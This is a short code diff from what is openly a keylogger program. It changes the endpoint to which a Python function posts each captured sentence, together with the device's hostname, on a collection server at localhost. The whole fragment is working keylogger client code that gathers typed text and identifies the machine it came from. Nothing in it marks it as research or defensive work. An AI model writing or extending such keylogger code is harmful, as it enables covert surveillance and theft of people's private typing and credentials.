@@ -14,7 +14,7 @@ def send_sentence(sentence):
     try:
         device_name = socket.gethostname()  # Get the device (host) name
         print(device_name)
-        requests.post("http://localhost:5000/event", json={
+        requests.post("http://localhost:5000/keylogger/event", json={
             "word": sentence,
             "device": device_name
         })
